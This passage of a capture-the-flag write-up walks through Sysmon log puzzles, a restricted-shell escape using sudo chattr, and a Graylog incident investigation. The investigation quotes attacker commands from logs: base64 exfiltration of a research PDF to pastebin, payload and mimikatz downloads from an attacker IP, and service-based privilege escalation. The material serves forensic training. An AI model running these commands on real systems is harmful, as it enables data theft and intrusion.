    1 1         {System.Diagnostics.Eventing.Reader.EventLogRecord}
   39 2         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
  179 3         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
    2 4         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
  905 5         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
   98 6         {System.Diagnostics.Eventing.Reader.EventLogRecord, Syst…
</code></pre><p>ID 1 is the one we are looking for.</p><pre tabindex=0><code>PS /&gt; $mylog | ? { $_.Id -match &#39;1&#39; }  

Message              : Process Create:
                       RuleName: 
                       UtcTime: 2019-11-07 17:59:56.525
                       ProcessGuid: {BA5C6BBB-5B9C-5DC4-0000-00107660A900}
                       ProcessId: 3664
                       Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                       FileVersion: 10.0.14393.206 (rs1_release.160915-0644)
                       Description: Windows PowerShell
                       Product: Microsoft® Windows® Operating System
                       Company: Microsoft Corporation
                       OriginalFileName: PowerShell.EXE
                       CommandLine: 
                       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c 
                       &#34;`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    
                       N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    
                       Rn=9`n}`n&#34;
                       CurrentDirectory: C:\
                       User: ELFURESEARCH\allservices
                       LogonGuid: {BA5C6BBB-5B9C-5DC4-0000-0020F55CA900}
                       LogonId: 0xA95CF5
                       TerminalSessionId: 0
                       IntegrityLevel: High
                       Hashes: MD5=097CE5761C89434367598B34FE32893B
                       ParentProcessGuid: {BA5C6BBB-4C79-5DC4-0000-001029350100}
                       ParentProcessId: 1008
                       ParentImage: C:\Windows\System32\svchost.exe
                       ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Id                   : 1
Version              : 5
Qualifiers           : 
Level                : 4
Task                 : 1
Opcode               : 0
Keywords             : -9223372036854775808
RecordId             : 2422
ProviderName         : Microsoft-Windows-Sysmon
ProviderId           : 5770385f-c22a-43e0-bf4c-06f5698ffbd9
LogName              : Microsoft-Windows-Sysmon/Operational
ProcessId            : 1960
ThreadId             : 6640
MachineName          : elfuresearch
UserId               : S-1-5-18
TimeCreated          : 11/7/19 5:59:56 PM
ActivityId           : 
RelatedActivityId    : 
ContainerLog         : microsoft-windows-sysmon/operational
MatchedQueryIds      : {}
Bookmark             : System.Diagnostics.Eventing.Reader.EventBookmark
LevelDisplayName     : Information
OpcodeDisplayName    : Info
TaskDisplayName      : Process Create (rule: ProcessCreate)
KeywordsDisplayNames : {}
Properties           : {System.Diagnostics.Eventing.Reader.EventProperty, 
                       System.Diagnostics.Eventing.Reader.EventProperty, 
                       System.Diagnostics.Eventing.Reader.EventProperty, 
                       ddasdSystem.Diagnostics.Eventing.Reader.EventProperty…
</code></pre><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#268bd2>$mylog</span> | ? { <span style=color:#268bd2>$_</span>.Id <span style=color:#719e07>-match</span> <span style=color:#2aa198>&#39;1&#39;</span> } | <span style=color:#b58900>Format-List</span> Properties | <span style=color:#b58900>ForEach-Object</span> {<span style=color:#268bd2>$_</span>.ToString()}
</span></span><span style=display:flex><span>Microsoft.PowerShell.Commands.Internal.Format.FormatStartData
</span></span><span style=display:flex><span>Microsoft.PowerShell.Commands.Internal.Format.GroupStartData
</span></span><span style=display:flex><span>Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData
</span></span><span style=display:flex><span>Microsoft.PowerShell.Commands.Internal.Format.GroupEndData
</span></span><span style=display:flex><span>Microsoft.PowerShell.Commands.Internal.Format.FormatEndData
</span></span></code></pre></div><p>This doesn't work</p><pre tabindex=0><code>PS /home/elf&gt; $myevent = $mylog | ? { $_.Id -match &#39;1&#39; }
PS /home/elf&gt; $myevent.Properties | Format-List

Value : 

Value : 2019-11-07 17:59:56.525
Value : ba5c6bbb-5b9c-5dc4-0000-00107660a900
Value : 3664
Value : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Value : 10.0.14393.206 (rs1_release.160915-0644)
Value : Windows PowerShell
Value : Microsoft® Windows® Operating System
Value : Microsoft Corporation
Value : PowerShell.EXE
Value : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c 
        &#34;`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n 
           Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n&#34;

Value : C:\
Value : ELFURESEARCH\allservices
Value : ba5c6bbb-5b9c-5dc4-0000-0020f55ca900
Value : 11099381
Value : 0
Value : High
Value : MD5=097CE5761C89434367598B34FE32893B
Value : ba5c6bbb-4c79-5dc4-0000-001029350100
Value : 1008
Value : C:\Windows\System32\svchost.exe
Value : C:\Windows\system32\svchost.exe -k netsvcs
</code></pre><p>Finally:</p><pre tabindex=0><code>PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/on).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:09 GMT                                                       
Content-Length: 32                                                                        

Christmas Cheer Laser Powered On
PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:15 GMT                                                       
Content-Length: 87                                                                        

Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:21 GMT                                                       
Content-Length: 82                                                                        

Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:26 GMT                                                       
Content-Length: 77                                                                        

Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf&gt; (Invoke-WebRequest -Uri http://localhost:1225/api/gas -Method POST -Body &#34;O=6&amp;H=7&amp;He=3&amp;N=4&amp;Ne=22&amp;Ar=11&amp;Xe=10&amp;F=20&amp;Kr=8&amp;Rn=9&#34;).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:32 GMT                                                       
Content-Length: 81                                                                        

Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent
HTTP/1.1 200 OK                                                                           
Server: Microsoft-NetCore/2.0                                                             
Date: Thu, 12 Dec 2019 22:17:47 GMT                                                       
Content-Length: 199                                                                       

Success! - 5.428 Mega-Jollies of Laser Output Reached!
</code></pre><h1 id=alabaster-snowball---nyancat-shell>Alabaster Snowball - NYANCAT Shell
<a class=header-link href=#alabaster-snowball---nyancat-shell><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Inside the shell</p><pre tabindex=0><code>nyancat, nyancat
I love that nyancat!
My shell&#39;s stuffed inside one
Whatcha&#39; think about that?

Sadly now, the day&#39;s gone
Things to do!  Without one...
I&#39;ll miss that nyancat
Run commands, win, and done!

Log in as the user alabaster_snowball with a password of Password2,
    and land in a Bash prompt.

Target Credentials:

username: alabaster_snowball
password: Password2
</code></pre><p>Some hints:</p><pre tabindex=0><code>User&#39;s Shells
From: Alabaster Snowball
On Linux, a user&#39;s shell is determined by the contents of /etc/passwd

Chatter?
From: Alabaster Snowball
sudo -l says I can run a command as root. What does it do?
</code></pre><p>Let's apply them:</p><pre tabindex=0><code>elf@e6d5f5ac3f24:~$ cat /etc/passwd
elf:x:1000:1000::/home/elf:/bin/bash
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
</code></pre><p><code>/bin/nsh</code> is immutable but we can remove it with <code>chattr</code></p><pre tabindex=0><code>elf@14a07541cd62:~$ lsattr /bin/nsh
----i---------e---- /bin/nsh
sudoelf@14a07541cd62:~$ chattr -i /bin/nsh
chattr: Permission denied while setting flags on /bin/nsh
elf@14a07541cd62:~$ sudo /usr/bin/chattr -i /bin/nsh
elf@14a07541cd62:~$ lsattr /bin/nsh
--------------e---- /bin/nsh
</code></pre><p>Everyone has rwx on <code>/bin/nsh</code>.</p><pre tabindex=0><code>elf@14a07541cd62:~$ ls -alt /bin/nsh
-rwxrwxrwx 1 root root 75680 Dec 11 17:40 /bin/nsh
</code></pre><p>Now we can login.</p><pre tabindex=0><code>elf@dff265704748:~$ su - alabaster_snowball
Password: 
Loading, please wait......

You did it! Congratulations!
</code></pre><h1 id=2-letter>2. Letter
<a class=header-link href=#2-letter><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Answer: <code>DEMAND</code>.</p><pre tabindex=0><code>Date: February 28, 2019

To the Administration, Faculty, and Staff of Elf University
17 Christmas Tree Lane
North Pole

From: A Concerned and Aggrieved
Character Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical
Characters... OR ELSE!

Attention All Elf University Personnel,

It remains a constant source of frustration that Elf University and the entire
operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end
holiday spree. We URGE you to consider lending your considerable resources and
expertise in providing merriment, cheer, toys, candy, and much more to other
holidays year-round, as well as to other mythical characters. For centuries, we
have expressed our frustration at your lack of willingness to spread your cheer
beyond the inaptly-called “Holiday Season.” There are many other perfectly fine
holidays and mythical characters that need your direct support year-round.

If you do not accede to our demands, we will be forced to take matters into our
own hands.  We do not make this threat lightly. You have less than six months to
act demonstrably.

Sincerely,

--A Concerned and Aggrieved Character
</code></pre><p>Is there anything in this letter?</p><p>Answer to question 2: <code>DEMAND</code></p><h1 id=tangle-coalbox---frosty-keypad>Tangle Coalbox - Frosty Keypad
<a class=header-link href=#tangle-coalbox---frosty-keypad><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><code>7331</code> is prime.</p><h1 id=pepper-minstix---graylog>Pepper Minstix - Graylog
<a class=header-link href=#pepper-minstix---graylog><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Actual page that can be opened in the browser:</p><ul><li><a href=https://graylog.elfu.org/ target=_blank rel="noreferrer noopener">https://graylog.elfu.org/</a></li></ul><h2 id=questions>Questions
<a class=header-link href=#questions><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><h3 id=question-1>Question 1
<a class=header-link href=#question-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the full-path + filename of the first malicious file downloaded by Minty?</p><ul><li>Answer <code>C:\Users\minty\Downloads\cookie_recipe.exe</code></li></ul><p>Search for <code>recipe</code> and one message pops up.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>CommandLine
</span></span><span style=display:flex><span>C:\Windows\SysWOW64\WindowsPowerShell\v1.<span style=color:#2aa198>0</span>\powershell.exe <span style=color:#b58900>Invoke-WebRequest</span> -Uri
</span></span><span style=display:flex><span>https://pastebin.com/post.php -Method POST -Body <span style=color:#268bd2>@</span>{ <span style=color:#2aa198>&#34;submit_hidden&#34;</span> =
</span></span><span style=display:flex><span><span style=color:#2aa198>&#34;submit_hidden&#34;</span>; <span style=color:#2aa198>&#34;paste_code&#34;</span> =
</span></span><span style=display:flex><span><span style=color:#268bd2>$</span>([<span style=color:#cb4b16>Convert</span>]::ToBase64String([<span style=color:#cb4b16>IO.File</span>]::ReadAllBytes(<span style=color:#2aa198>&#34;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&#34;</span>)));
</span></span><span style=display:flex><span><span style=color:#2aa198>&#34;paste_format&#34;</span> = <span style=color:#2aa198>&#34;1&#34;</span>; <span style=color:#2aa198>&#34;paste_expire_date&#34;</span> = <span style=color:#2aa198>&#34;N&#34;</span>; <span style=color:#2aa198>&#34;paste_private&#34;</span> = <span style=color:#2aa198>&#34;0&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#2aa198>&#34;paste_name&#34;</span>=<span style=color:#2aa198>&#34;cookie recipe&#34;</span> }
</span></span></code></pre></div><p><code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></p><p>This is for alabaster and not what we want.</p><p>Searching for <code>minty</code> brings up a lot of results but if we search for it in the
results in the browser with <code>ctrl+f</code> we can see the downloaded file:</p><p><code>C:\Users\minty\Downloads\cookie_recipe.exe</code></p><h3 id=question-2>Question 2
<a class=header-link href=#question-2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The malicious file downloaded and executed by Minty gave the attacker remote
access to his machine. What was the ip:port the malicious file connected to
first?</p><ul><li>Answer <code>192.168.247.175:4444</code></li></ul><p>Searching for <code>cookie_recipe.exe</code> we can then click on <code>EventID</code> to the left and
then click on <code>Quick Values</code> to bring up a chart. Then we can click on the
magnifying glass beside each value to filter by that event ID.</p><ul><li><code>cookie_recipe.exe AND EventID:2</code> is when Firefox created the downloaded file.</li><li><code>cookie_recipe.exe AND EventID:3</code> is what we want.</li></ul><pre tabindex=0><code>message

elfu-res-wks1 MSWinEventLog 1   Microsoft-Windows-Sysmon/Operational    2441
Tue Nov 19 05:24:04 2019    3   Microsoft-Windows-Sysmon    SYSTEM  User
Information elfu-res-wks1   Network connection detected (rule: NetworkConnect)
Network connection detected:  RuleName:   UtcTime: 2019-11-19 13:24:03.757
ProcessGuid: {BA5C6BBB-ECF2-5DD3-0000-001086363300}  ProcessId: 5256  Image:
C:\Users\minty\Downloads\cookie_recipe.exe  User: ELFU-RES-WKS1\minty  Protocol:
tcp  Initiated: true  SourceIsIpv6: false  SourceIp: 192.168.247.177
SourceHostname: elfu-res-wks1.localdomain  SourcePort: 53564  SourcePortName:
DestinationIsIpv6: false  DestinationIp: 192.168.247.175  DestinationHostname:
DEFANELF  DestinationPort: 4444  DestinationPortName:    20132
</code></pre><p><code>192.168.247.175:4444</code></p><h3 id=question-3>Question 3
<a class=header-link href=#question-3><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What was the first command executed by the attacker?</p><ul><li>(answer is a single word) <code>whoami</code></li></ul><p>Searching for <code>cookie_recipe</code> and looking at timestamps, the first action after
<code>Tue Nov 19 05:24:04 2019</code> that we saw above is <code>C:\Windows\system32\cmd.exe /c "whoami "</code></p><h3 id=question-4>Question 4
<a class=header-link href=#question-4><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the one-word service name the attacker used to escalate privileges?</p><ul><li>Answer <code>webexservice</code></li></ul><pre tabindex=0><code>C:\Windows\system32\cmd.exe /c &#34;Invoke-WebRequest -Uri
    http://192.168.247.175/cookie_recipe2.exe -OutFile cookie_recipe2.exe &#34;

C:\Windows\system32\cmd.exe /c &#34;sc start webexservice a software-update 1 
wmic process call create &#34;cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe&#34; &#34;
</code></pre><h3 id=question-5>Question 5
<a class=header-link href=#question-5><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the file-path + filename of the binary ran by the attacker to dump
credentials?</p><ul><li>Answer <code>C:\cookie.exe</code></li></ul><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\system32\cmd.exe /c <span style=color:#2aa198>&#34;Invoke-WebRequest -Uri
</span></span></span><span style=display:flex><span><span style=color:#2aa198>https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190813/mimikatz_trunk.zip
</span></span></span><span style=display:flex><span><span style=color:#2aa198>-OutFile cookie.zip &#34;</span>
</span></span></code></pre></div><p>Searching for <code>mimikatz</code> we find another event. It says the original filename of
<code>cookie.exe</code> was <code>mimikatz</code>. It was renamed.</p><p><code>C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe "</code></p><h3 id=question-6>Question 6
<a class=header-link href=#question-6><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The attacker pivoted to another workstation using credentials gained from
Minty's computer. Which account name was used to pivot to another machine?</p><ul><li>Answer <code>alabaster</code></li></ul><p><a href=https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf target=_blank rel="noreferrer noopener">https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf</a></p><pre tabindex=0><code>event ID `4624`
LogonType: 10 == remote == RDP - Logon Type 10 – RemoteInteractive

EventID:4624 AND LogonType:10
</code></pre><p>There is only one event at <code>06:04:28</code>.</p><h3 id=question-7>Question 7
<a class=header-link href=#question-7><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to
another machine?</p><ul><li>Answer <code>06:04:28</code></li></ul><h3 id=question-8>Question 8
<a class=header-link href=#question-8><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The attacker navigates the file system of a third host using their Remote
Desktop Connection to the second host. What is the
SourceHostName,DestinationHostname,LogonType of this connection? (submit in that
order as csv)</p><ul><li>Answer <code>ELFU-RES-WKS2,ELFU-RES-WKS3,3</code></li></ul><p>Our info:</p><ul><li>Time: <code>2019-11-19 06:07:22.000</code></li><li>Filter: <code>SourceHostName:ELFU\-RES\-WKS2 AND DestinationHostname:elfu\-res\-wks3</code></li></ul><p>The attacker has GUI access to workstation 2 via RDP. They likely use this GUI
connection to access the file system of workstation 3 using explorer.exe via
UNC file paths (which is why we don't see any cmd.exe or powershell.exe process
creates). However, we still see the successful network authentication for this
with event id 4624 and logon type 3.</p><h3 id=question-9>Question 9
<a class=header-link href=#question-9><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the full-path + filename of the secret research document after being
transferred from the third host to the second host?</p><ul><li>Answer <code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></li></ul><p>Our filter is: <code>ProcessImage:C\:\\Windows\\Explorer.EXE AND source:elfu\-res\-wks2</code></p><p>Sorting by date, only one event is after the logon timestamp above.</p><pre tabindex=0><code>CreationUtcTime
    2019-11-19T14:07:50.000Z
EventID
    2
ProcessId
    4372
ProcessImage
    C:\Windows\Explorer.EXE
TargetFilename
    C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf
WindowsLogType
Microsoft-Windows-Sysmon/Operational
</code></pre><h3 id=question-10>Question 10
<a class=header-link href=#question-10><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the IPv4 address (as found in logs) the secret research document was
exfiltrated to?</p><ul><li>Answer <code>104.22.3.84</code></li></ul><p>Searching for <code>super_secret_elfu_research.pdf</code> there are 3 events.</p><pre tabindex=0><code>2019-11-19 06:14:24.000

C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri
https://pastebin.com/post.php -Method POST -Body @{ &#34;submit_hidden&#34; =
&#34;submit_hidden&#34;; &#34;paste_code&#34; =
$([Convert]::ToBase64String([IO.File]::ReadAllBytes(&#34;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&#34;)));
&#34;paste_format&#34; = &#34;1&#34;; &#34;paste_expire_date&#34; = &#34;N&#34;; &#34;paste_private&#34; = &#34;0&#34;;
&#34;paste_name&#34;=&#34;cookie recipe&#34; }
</code></pre><p>We know exfiltration was done with PowerShell from wks2 so our filter is:</p><ul><li><code>SourceHostname:elfu\-res\-wks2.localdomain AND ProcessImage:C\:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code></li></ul><p>Which gives us one event.</p><pre tabindex=0><code>DestinationHostname
    pastebin.com
DestinationIp
    104.22.3.84
DestinationPort
    80
EventID
    3
ProcessId
    1232
ProcessImage
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
Protocol
    tcp
SourceHostname
    elfu-res-wks2.localdomain
SourceIp
    192.168.247.177
SourcePort
53564
</code></pre><h1 id=kent-tinseltooth---smart-braces>Kent Tinseltooth - Smart Braces
<a class=header-link href=#kent-tinseltooth---smart-braces><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><code>srf.elfu.org</code></p><p>A proper configuration for the Smart Braces should be exactly:</p><ol><li>Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.</li><li>Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the
INPUT and the OUTPUT chains.</li><li>Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access
the local SSH server (on port 22).</li><li>Create a rule to ACCEPT any source IP to the local TCP services on ports 21
and 80.</li><li>Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.</li><li>Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo
